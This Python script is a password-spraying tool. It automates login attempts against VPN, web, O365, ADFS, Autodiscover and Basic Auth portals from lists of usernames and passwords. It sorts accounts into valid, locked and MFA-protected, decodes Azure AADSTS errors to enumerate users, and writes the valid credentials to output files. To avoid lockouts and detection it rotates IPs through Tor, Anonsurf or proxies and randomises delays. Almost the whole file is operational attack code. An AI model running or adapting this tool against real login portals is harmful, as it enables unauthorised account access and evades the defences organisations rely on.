#!/usr/bin/python3

# Modules & Functions
from core.all_modules import *
from core.all_functions import * 

banner()

# Parameters
parser = argparse.ArgumentParser()
parser.add_argument("-t", "--target", required=True, type=str, help="Target Portal URL / IP")
parser.add_argument('-spraytype', type=str, default='standard', choices=('autodiscover', 'adfs', 'o365', 'standard', 'basicauth'), help='Choose Spraytype: autodiscover - adfs - o365 - standard - basicauth')
parser.add_argument("-g", "--group", type=str, help="Group/Option name (VPN ex. DOMAIN/vpngroup)")
parser.add_argument("-u", "--usernames_list", required=False, type=str, help="Usernames / Emails list") 
parser.add_argument("-p", "--passwords_list", required=False, type=str, help="Passwords list")
parser.add_argument('-up', '--userpass_list', required=False, default=None, action='store', help='List with format user:password')
parser.add_argument("-tor", action='store_true', help="Activate TOR | script only | IP Rotation per Attempt")
parser.add_argument("-anonsurf", action='store_true', help="Activate Anonsurf | system-wide (ip-tables) | IP Rotation amount can be set with the rotate parameter")
parser.add_argument("-l", "--list", type=str, help="Proxy List")
parser.add_argument('-rd', "--delay", nargs=2, type=int, metavar=('minimum_sleep', 'maximum_sleep'), help="Randomize the delay between each attempt in seconds | Ex: -rd 3 10")
parser.add_argument("-r", "--rotate", type=int, default=1, help="Number of attempts before rotating the IP | Default = 1")
parser.add_argument("-apl", "--attempts", type=int, default=6,help="Number of attempts per lockout, X amount means the script will perform X-1 attempts")
parser.add_argument("-b", "--login_button", type=str, help="Help the script recognize a custom login button name on the target (Ex: Log In)")
parser.add_argument("-s", "--sleep", type=int, default=2, help="Delay between Selenium actions (only if the sprayer doesn't work)")
parser.add_argument("-o", "--output_type", type=str, default='txt', help="Output type [txt-csv-json]")
parser.add_argument("-v", "--verbose", action='store_true', default=False, help="Show Details")
parser.add_argument("-d", "--debug", default=False, action='store_true', help="Show errors, wrong credentials and browser (headless=false)")
args = parser.parse_args()

# Empty Lists
used_usernames = []
used_passwords = []
proxies_list = []
show_valid_accounts = []

# Chromedriver Path
chrome_path = f'{os.getcwd()}/core/chromedriver'

# Parameters / Variables | Setup
def empty_lists():
	global used_accounts_list 	; global used_usernames_list 	; global used_passwords_list
	global MFA_accounts_list 	; global MFA_usernames_list 	; global MFA_passwords_list
	global locked_accounts_list ; global locked_usernames_list 	; global locked_passwords_list
	global valid_accounts_list 	; global valid_usernames_list 	; global valid_passwords_list

	used_accounts_list = [] 	; used_usernames_list = [] 		; used_passwords_list = []
	MFA_accounts_list = [] 		; MFA_usernames_list = [] 		; MFA_passwords_list = []
	locked_accounts_list = [] 	; locked_usernames_list = [] 	; locked_passwords_list = []
	valid_accounts_list = []	; valid_usernames_list = [] 	; valid_passwords_list = []

# Save to TXT
def save_to_txt(file, list_):
	with open(file, 'a') as f:
		for a in list_:
			f.write(a)
			f.write('\n')
	f.close()

# Save to CSV
def save_to_csv(file, list_, users_list, pass_list):
	for a in list_:
		users_list.append(a.split(':')[0].strip())
		pass_list.append(a.split(':')[1].strip())	
	a = {'Usernames' : users_list ,'Passwords' : pass_list}
	df = pd.DataFrame(a, columns=['Usernames', 'Passwords'])
	df.to_csv(f'{file}', mode='a', header=False, index=None)

# Save to JSON
def save_to_json(file, list_, users_list, pass_list):
	for a in list_:
		users_list.append(a.split(':')[0].strip())
		pass_list.append(a.split(':')[1].strip())
	a = dict(zip(users_list, pass_list))
	with open(file, 'a') as f:
		f.write(json.dumps(a, indent=4, sort_keys=False))
		f.write('\n')

# Save all Files (Used - MFA - Locked - Valid)
def save_to_files(args):
	
	global used_accounts_file 	; global used_accounts_list 
	global MFA_accounts_file 	; global MFA_accounts_list
	global locked_accounts_file ; global locked_accounts_list
	global valid_accounts_file 	; global valid_accounts_list
	
	if args.output_type == 'txt':
		save_to_txt(used_accounts_file, used_accounts_list)
		save_to_txt(MFA_accounts_file, MFA_accounts_list)
		save_to_txt(locked_accounts_file, locked_accounts_list)
		save_to_txt(valid_accounts_file, valid_accounts_list)
	elif args.output_type == 'csv':
		save_to_csv(used_accounts_file, used_accounts_list, used_usernames_list, used_passwords_list)
		save_to_csv(MFA_accounts_file, MFA_accounts_list, MFA_usernames_list, MFA_passwords_list)
		save_to_csv(locked_accounts_file, locked_accounts_list, locked_usernames_list, locked_passwords_list)
		save_to_csv(valid_accounts_file, valid_accounts_list, valid_usernames_list, valid_passwords_list)
	elif args.output_type == 'json':
		save_to_json(used_accounts_file, used_accounts_list, used_usernames_list, used_passwords_list)
		save_to_json(MFA_accounts_file, MFA_accounts_list, MFA_usernames_list, MFA_passwords_list)
		save_to_json(locked_accounts_file, locked_accounts_list, locked_usernames_list, locked_passwords_list)
		save_to_json(valid_accounts_file, valid_accounts_list, valid_usernames_list, valid_passwords_list)

empty_lists()
REMOVED_usernames = []

# Files
if os.path.isdir('./outputs') == False:
	os.system('mkdir outputs')
else:
	pass

used_accounts_file   	=  f'{os.getcwd()}/outputs/logs.{args.output_type}'
locked_accounts_file    =  f'{os.getcwd()}/outputs/locked.{args.output_type}'
MFA_accounts_file       =  f'{os.getcwd()}/outputs/MFA.{args.output_type}'
valid_accounts_file   	=  f'{os.getcwd()}/outputs/valid_credentials.{args.output_type}'
INVALID_FILE 			=  f'{os.getcwd()}/outputs/invalid.{args.output_type}'

# Debug = True, browser will show
if args.debug:
	headless = False
elif args.debug == False:
	headless = True

# Variables
target = args.target

# Proxy List
if args.list:
	proxy_path = args.list
	with open(proxy_path) as f:
		proxies_list = f.read().splitlines()
		f.close()

# Login Button
if args.login_button:
	login_button = args.login_button

# Usernames List + Passwords List
if not args.userpass_list and args.usernames_list and args.passwords_list:
	usernames_list = open(args.usernames_list).read().splitlines()
	passwords_list = open(args.passwords_list).read().splitlines()
	pairs 		= [(u,p) for p in passwords_list for u in usernames_list]
elif args.userpass_list: # [USERS:PASSWORDS] List
	creds 			= list(filter(None,[c for c in open(args.userpass_list).read().splitlines()]))
	usernames_list 	= [c.split(":")[0] for c in creds]
	passwords_list 	= [c.split(":")[1] for c in creds]
	pairs 			= [(c.split(":")[0],c.split(":")[1]) for c in creds]

count = 0 ; rotate_count = 0 ; passwords_count = 0 ; lockout = 0

# Total Combinations 
if args.usernames_list and args.passwords_list or args.userpass_list:
	total = len(pairs)

# Check Sign-in
target = check_signin(target, args)

if not args.usernames_list and not args.passwords_list and not args.userpass_list:
	sys.exit()

# Printing
print(f'\n[*] Total users:		{len(usernames_list)}')
print(f'[*] Total passwords:		{len(passwords_list)}')
print(f'[*] Total combinations:		{total}')
print(f'[*] Debug mode:			{args.debug == True}\n')

try:
	if args.spraytype in ['standard', 'o365']:

		# Proxy List
		if args.list:
			print(f'[*] Setting up a Proxy...')
			driver, options = proxy_browser(target, headless, proxies_list, args)

		# TOR
		elif args.tor:
			driver, options = tor_browser(headless)

		# Anonsurf
		elif args.anonsurf:
			print(f'[*] Setting up Anonsurf...')
			driver, options = anonsurf_browser(headless)

		elif not args.list and not args.tor and not args.anonsurf:
			driver, options = no_proxy_browser(target, headless)

		else:
			driver, options = tor_browser(headless)

		for credential in pairs:
			ALREADY_CHECKED = False

			username = credential[0]
			password = credential[1]

			# APL
			# Example | used_passwords = ['pass1', 'pass1', 'pass2']
			# Example | Counter(used_passwords) = {'pass1':2, 'pass2':1}
			used_usernames.append(username)
			used_passwords.append(password)
			for each in used_usernames:
				if Counter(used_usernames)[each] == args.attempts:
					print(f'[*] {args.attempts-1} attempt(s) per user were tried')
					kill_browser() ; sys.exit()

			empty_lists()

			count += 1
			progress = f"[{count}/{total}]"

			if username in REMOVED_usernames: 
				if args.verbose: print(f'{progress} | [-] | {username} has already been tried')
			
			else:
				used_accounts_list.append(f'{username}:{password}')
				while True:
					try:
						driver.set_page_load_timeout(20)
						go_to(target)
					
					except (TimeoutException, WebDriverException):
						driver, options = restart_proxy_anonsurf(args, headless, target, driver, options, proxies_list)
						continue
					break
				sleep(args.sleep)

				# Standard Portal
				if args.spraytype == 'standard':

					# Analyze Portal
					if analyze == False:
						analyze, PORTAL_FORMAT, USERNAMES_SUBMIT, PASSWORD_SUBMIT, LOGIN_BUTTON, LOGIN_BUTTON_2, driver, options = analyze_portal(args, USERNAMES_SUBMIT, PASSWORD_SUBMIT, LOGIN_BUTTON, LOGIN_BUTTON_2, username_box, password_box, driver, options, target, headless, proxies_list)
						go_to(target) ; sleep(args.sleep) 

					# VPN Group, usage: combobox/group 
					# Example: Combobox is named DOMAINS, Group is named VPN1 -> Input for parameter = DOMAINS/VPN1
					if args.group:
						group = args.group
						group1 = group.split('/')[0] ; group2 = group.split('/')[1]
						select(ComboBox(group1), group2)

					# Write username and password based on Portal Format determined by analyzing the portal.
					while True:
						try:
							if PORTAL_FORMAT == 2:
								#print('2 Boxes')
								write(username, into=USERNAMES_SUBMIT)
								write(password, into=PASSWORD_SUBMIT)
								click(LOGIN_BUTTON) ; sleep(args.sleep)

							elif PORTAL_FORMAT == 1:
								#print('1 Box')
								write(username, into=USERNAMES_SUBMIT)
								click(LOGIN_BUTTON) ; sleep(args.sleep)
								
								write(password, into=PASSWORD_SUBMIT)
								click(LOGIN_BUTTON_2) ; sleep(args.sleep)
						
						except StaleElementReferenceException:
							sleep(2)
							continue
						except LookupError:
							if PORTAL_FORMAT == 1: go_to(target)
							continue
						break
				
				# O365 Portal
				elif args.spraytype == 'o365':
					INVALID_LIST = []
					while True:
						try:
							#go_to(target) ; sleep(args.sleep)
							write(username, into='Email')
							click('Next') ; sleep(args.sleep)
							for x in invalid_messages:
								if Text(x).exists():
									print(f"{progress} | [-] | {username} is not valid")
									ALREADY_CHECKED = True
									REMOVED_usernames.append(username)
									INVALID_LIST.append(username)
									
									if args.output_type == 'txt':
										save_to_txt(INVALID_FILE, INVALID_LIST)

									elif args.output_type == 'csv':
										a = {'Not valid accounts' : INVALID_LIST}
										df = pd.DataFrame(a, columns=['Not valid accounts'])
										df.to_csv(f'{INVALID_FILE}', mode='a', header=False, index=None)
									
									elif args.output_type == 'json':
										with open(INVALID_FILE, 'a') as f:
											f.write(json.dumps(INVALID_LIST, indent=4, sort_keys=False))
											f.write('\n')
											f.close()
									#go_to(target)
									break
								
							else:
								write(password, into='Password') 
								click('Sign in') ; sleep(args.sleep) 
						except:
							driver, options = restart_proxy_anonsurf(args, headless, target, driver, options, proxies_list)
							go_to(target)
							continue
						break

				# Check window title name in case of o365
				if ALREADY_CHECKED == False and args.spraytype == 'o365':
					sleep(2)
					# Temp fix for o365 accounts returning false positives if it reaches a certain page
					if driver.title == 'Microsoft Office Home':
						print(f'{progress} | [+] | [{username}:{password}] | VALID CREDENTIALS')
						valid_accounts_list.append(f'{username}:{password}')
						show_valid_accounts.append(f'{username}:{password}')
						REMOVED_usernames.append(username)
						ALREADY_CHECKED = True
						kill_browser()
						if args.list: driver, options = proxy_browser(target, headless, proxies_list, args)
						elif args.anonsurf: driver = webdriver.Chrome(chrome_path, options=options) ; set_driver(driver)
						elif args.tor: driver, options = restart_tor_browser(headless)
						else: driver, options = no_proxy_browser(headless)
						go_to(target)

				# Check messages on the portal 
				# Lockout
				if ALREADY_CHECKED == False:
					for x in lockout_detection:
						if Text(x).exists():
							if args.verbose: print(f'{progress} | [#] | Account : {username} is Locked ')
							locked_accounts_list.append(f'{username}:{password}')
							REMOVED_usernames.append(username)
							ALREADY_CHECKED = True
							break

				# MFA
				if ALREADY_CHECKED == False:
					for x in mfa:
						if Text(x).exists():
							if args.verbose: print(f'{progress} | [@] | MFA detected on : {username}')
							print(f'{progress} | [+] | [{username}:{password}] | VALID CREDENTIALS')
							MFA_accounts_list.append(f'{username}:{password}')
							valid_accounts_list.append(f'{username}:{password}')
							show_valid_accounts.append(f'{username}:{password}')
							REMOVED_usernames.append(username)
							ALREADY_CHECKED = True
							kill_browser()
							if args.list: driver, options = proxy_browser(target, headless, proxies_list, args)
							elif args.anonsurf: driver = webdriver.Chrome(chrome_path, options=options) ; set_driver(driver)
							else:  					driver, options = no_proxy_browser(headless)
							break

				# Wrong
				if ALREADY_CHECKED == False:
					for x in wrong:
						if Text(x).exists():
							if args.verbose: print(f'{progress} | [x] | [{username}:{password}] | WRONG CREDENTIALS')
							ALREADY_CHECKED = True
							break

				# Remove False Positives and also return Valid Creds.
				if ALREADY_CHECKED == False:
					try:
						try:
							write(' ', into=USERNAMES_SUBMIT)
						except:
							write(' ', into=PASSWORD_SUBMIT)
						if args.verbose: print(f'{progress} | [x] | [{username}:{password}] | WRONG CREDENTIALS')
						ALREADY_CHECKED = True
					except:
						if ALREADY_CHECKED == False:
							if driver.current_url.lower() == target.lower():
								if args.verbose: print(f'{progress} | [x] | [{username}:{password}] | WRONG CREDENTIALS')
								ALREADY_CHECKED = True

							if ALREADY_CHECKED == False:
								print(f'{progress} | [+] | [{username}:{password}] | VALID CREDENTIALS')
								valid_accounts_list.append(f'{username}:{password}')
								show_valid_accounts.append(f'{username}:{password}')
								REMOVED_usernames.append(username)
								kill_browser()
								if args.list:  driver, options = proxy_browser(target, headless, proxies_list, args)
								elif args.anonsurf:	driver = webdriver.Chrome(chrome_path, options=options) ; set_driver(driver)
								else:  			driver, options = no_proxy_browser(headless)
				
				# Save files to the desired format.
				save_to_files(args)

				# Progress
				if args.verbose == False: print(f'[*] Progress: {progress}')

				# Random Delay
				if args.delay:
					delay = round(random.uniform(args.delay[0], args.delay[1]), 3)
					if args.verbose:  print(f'[*] Delay for: {delay} s')
					sleep(delay)			

				# Rotate Tor
				if args.tor:
					try:
						rotate_tor()
					except KeyboardInterrupt:
						print('\n[!] Keyboard interrupted')
						kill_browser()
						sys.exit()
					
				# Rotate Proxies + Anonsurf
				if args.rotate:
					rotate_count += 1
					if rotate_count == args.rotate and count != total:
						if args.list:
							print('[*] Proxy rotation')
							kill_browser()
							driver, options = proxy_browser(target, headless, proxies_list, args)
							rotate_count = 0
						elif args.anonsurf:
							print('[*] IP rotation')
							kill_browser()
							anonsurf_subprocess = subprocess.run(['sudo', 'anonsurf', 'restart'], capture_output=True)
							while True:
								try:    print(f'[*] Your IP after rotating Anonsurf : {requests.get("https://api.ipify.org").text}')
								except:
									print("[!] Sorry, I'am facing difficulties getting the new Anonsurf IP")
									anonsurf_subprocess = subprocess.run(['sudo', 'anonsurf', 'restart'], capture_output=True)
									continue
								break
							driver = webdriver.Chrome(chrome_path, options=options) ; set_driver(driver) ; go_to(target)
							rotate_count = 0

		try: kill_browser()
		except: pass

	elif args.spraytype in ['basicauth', 'autodiscover', 'adfs']:

		# Proxy List
		if args.list:
			print(f'[*] Setting up a Proxy...')
			PROXY = proxy(proxies_list, target, args)
			PROXY_http = f'http://{PROXY}'
			PROXY_https = f'https://{PROXY}'
			proxies={'http': PROXY_http}

		# TOR 
		elif args.tor:
			print(f'[*] Setting up Tor...')
			os.system('sudo service tor restart')
			sleep(5)
			proxies={'http': 'socks5h://localhost:9050'}
			get_current_ip()

		# Anonsurf
		elif args.anonsurf:
			proxies = False
			print(f'[*] Setting up Anonsurf...')
			anonsurf_subprocess = subprocess.run(['sudo', 'anonsurf', 'start'], capture_output=True)
			while True:
				try:
					print(f'[*] IP after activating Anonsurf : {requests.get("https://api.ipify.org").text}')
				except:
					print("[!] Facing difficulties getting the new Anonsurf IP\n")
					anonsurf_subprocess = subprocess.run(['sudo', 'anonsurf', 'restart'], capture_output=True)
					continue
				break
		else:
			print('[-] No Proxy provided') ; proxies = False
			
		for credential in pairs:

			username = credential[0]
			password = credential[1]

			# APL
			used_usernames.append(username)
			used_passwords.append(password)
			for each in used_usernames:
				if Counter(used_usernames)[each] == args.attempts:
					print(f'[*] {args.attempts-1} attempt(s) per user were tried')
					sys.exit()
			
			empty_lists()
				
			# Progress
			count += 1
			progress = f"[{count}/{total}]"

			# Used credentials adding to list for later saving
			used_accounts_list.append(f'{username}:{password}')

			# BasicAuth Portal
			if args.spraytype == 'basicauth':
				s = Session()
				s.auth = (username, password)
				response = s.get(target, proxies=proxies)

				# Status code 
				status   = response.status_code
				
				if status == 200:
					print(f'{progress} | [+] | [{username}:{password}] | VALID CREDENTIALS')
					valid_accounts_list.append(f'{username}:{password}')
					show_valid_accounts.append(f'{username}:{password}')
					usernames_list.remove(username)
				else:
					if args.verbose: print(f"{progress} | [x] | [{username}:{password}] | WRONG CREDENTIALS")

			# AutoDiscover Portal
			elif args.spraytype == 'autodiscover':
					
				# Class for authentication on the requests module, requires the username and a password
				auth     = HTTPBasicAuth(username, password)
				url 	 = target
					
				while True:
					# Making a GET request using the authentication data
					try:
						response = send_request_autodiscover(args, requests.get, url, auth, headers, proxies)
					except ProxyError:
						print('[*] Trying another Proxy...')
						PROXY = proxy(proxies_list, target, args)
						PROXY_http = f'http://{PROXY}'
						PROXY_https = f'https://{PROXY}'
						proxies = {'http': PROXY_http}
						continue
					except MissingSchema:
						target = urlparse(target)._replace(scheme='https').geturl()
						target = target.replace('https:///', 'https://')
						continue
					break

				# Status code 
				status   = response.status_code

				if status == 200:
					print(f'{progress} | [+] | [{username}:{password}] | VALID CREDENTIALS')
					valid_accounts_list.append(f'{username}:{password}')
					usernames_list.remove(username)
					show_valid_accounts.append(f'{username}:{password}')

				elif status == 456:
					print(f'{progress} | [+] | [{username}:{password}] | VALID CREDENTIALS')
					valid_credentials_list.append(f'{username}:{password}')
					usernames_list.remove(username)

				else:
					# Handle Autodiscover errors that are returned by the server, check if messages exist on the headers of the response
					if "X-AutoDiscovery-Error" in response.headers.keys():

						# Handle Basic Auth blocking
						basic_errors = [
							"Basic Auth Blocked",
							"BasicAuthBlockStatus - Deny",
							"BlockBasicAuth - User blocked"] # let me check this

						# Handle Autodiscover errors
						if any(_str in response.headers["X-AutoDiscovery-Error"] for _str in basic_errors):
							if args.verbose: print(f"{progress} | [#] | [{username}] is blocked")
							usernames_list.remove(username)

						else:
							# Handle AADSTS errors
							if any(error in response.headers["X-AutoDiscovery-Error"] for error in AADSTS_codes.keys()):
								if 'AADSTS50126' in error:
									if args.verbose: print(f"{progress} | [#] | Invalid username or password. Username: {username} could exist.")
								elif 'AADSTS50128' in error:
									if args.verbose: print(f"{progress} | [#] | Tenant for account {username} doesn't exist. Check the domain to make sure they are using Azure/O365 services")								
								elif 'AADSTS50034' in error:
									if args.verbose: print(f"{progress} | [#] | The user {username} doesn't exist.")
									usernames_list.remove(username)
								elif error in ['AADSTS50079', 'AADSTS50076']:
									if args.verbose: print(f"{progress} | [#] | {username}:{password} - NOTE: The response indicates MFA (Microsoft) is in use.")
									MFA_accounts_list.append(f'{username}:{password}')
									valid_accounts_list.append(f'{username}:{password}')
									usernames_list.remove(username)
								elif 'AADSTS50158' in error:
									if args.verbose: print(f"{progress} | [#] | {username}:{password} - NOTE: The response indicates conditional access (MFA: DUO or other) is in use.")
									MFA_accounts_list.append(f'{username}:{password}')
									valid_accounts_list.append(f'{username}:{password}')	
									usernames_list.remove(username)
								elif "AADSTS50053" in error:
									lockout += 0
									if args.verbose: print(f"{progress} | [#] | The account {username} appears to be locked.")
									locked_accounts_list.append(f'{username}:{password}')
									usernames_list.remove(username)
								elif 'AADSTS50057' in error:
									if args.verbose: print(f"{progress} | [#] | The account {username} appears to be disabled.")
									usernames_list.remove(username)
								elif 'AADSTS50055' in error:
									if args.verbose: print(f"{progress} | [#] | {username}:{password} - NOTE: The user's password is expired.")
									usernames_list.remove(username)
							else:
								if args.verbose: print(f"{progress} | [x] | [{username}:{password}] | WRONG CREDENTIALS")
					else:
						# No valid credentials, lockout or error handling
						if args.verbose: print(f"{progress} | [x] | [{username}:{password}] | WRONG CREDENTIALS")

			# ADFS Portal
			elif args.spraytype == 'adfs': 
				sleep(0.250)

				# POST request
				data     = f"UserName={username}&Password={password}&AuthMethod=FormsAuthentication"
				url      = target
				
				# Sending the POST request
				while True:
					try:
						response = send_request_adfs(args, requests.post, url, data, headers, proxies)
					except (ProxyError, ConnectTimeout):
						print('[*] Trying another Proxy...')
						PROXY = proxy(proxies_list, target, args)
						PROXY_http = f'http://{PROXY}'
						PROXY_https = f'https://{PROXY}'
						proxies = {'http': PROXY_http}
						continue
					break
				
				# Status code
				status   = response.status_code

				if status == 302:
					print(f'{progress} | [+] | [{username}:{password}] | VALID CREDENTIALS')
					valid_credentials_list.append(f'{username}:{password}')
					usernames_list.remove(username)

				else:
					if args.verbose: print(f"{progress} | [x] | [{username}:{password}] | WRONG CREDENTIALS")

			save_to_files(args)

			# Progress
			if args.verbose == False: print(f'[*] Progress: {progress}')

			# Random Delay
			if args.delay:
				delay = round(random.uniform(args.delay[0], args.delay[1]), 3)
				if args.verbose: print(f'[*] Delay for: {delay} s')
				sleep(delay)

			# Rotate Tor
			if args.tor:
				rotate_tor()

			# Rotate Proxies + Anonsurf
			if args.rotate:
				rotate_count += 1
				if args.rotate == rotate_count and count != total:
					if args.list:
						print('[*] Proxy rotation')
						while True:
							try:
								PROXY = proxy(proxies_list, target, args)
							except SSLError:
								continue
							break
						PROXY_http = f'http://{PROXY}'
						PROXY_https = f'https://{PROXY}'
						proxies = {'http': PROXY_http}
						rotate_count = 0

					elif args.anonsurf:
						print('[*] IP rotation')
						anonsurf_subprocess = subprocess.run(['sudo', 'anonsurf', 'restart'], capture_output=True)
						while True:
							try:
								IP_ANONSURF = requests.get('https://api.ipify.org').text
								print(f'[*] IP after activating Anonsurf : {IP_ANONSURF}')
							except:
								print("[!] Facing difficulties getting the new Anonsurf IP")
								anonsurf_subprocess = subprocess.run(['sudo', 'anonsurf', 'restart'], capture_output=True)
								continue
							break
						rotate_count = 0

	if args.anonsurf:
		print('[-] Stopping Anonsurf...')
		anonsurf_subprocess = subprocess.run(['sudo', 'anonsurf', 'stop'], capture_output=True)

except KeyboardInterrupt:

	print('\n[!] Keyboard interrupted')
	try: 
		kill_browser()
		sys.exit()
	except: 
		pass
	
	if args.anonsurf:
		print('[-] Stopping Anonsurf...')
		try:    
			anonsurf_subprocess = subprocess.run(['sudo', 'anonsurf', 'stop'], capture_output=True)
		except: 
			sys.exit()
	
print('[*] Spraying is done.')
show_valid_accounts = list(set(show_valid_accounts))
print('-'*50)
print(f'[ ] Valid credentials : {show_valid_accounts}')
print('-'*50)

sys.exit()